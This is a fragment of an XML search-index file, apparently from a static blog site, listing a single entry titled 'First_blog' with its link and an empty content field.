    
    
  </entry>
  
  
  
  <entry>
    <title>First_blog</title>
    <link href="/2023/08/21/First-blog/"/>
    <url>/2023/08/21/First-blog/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
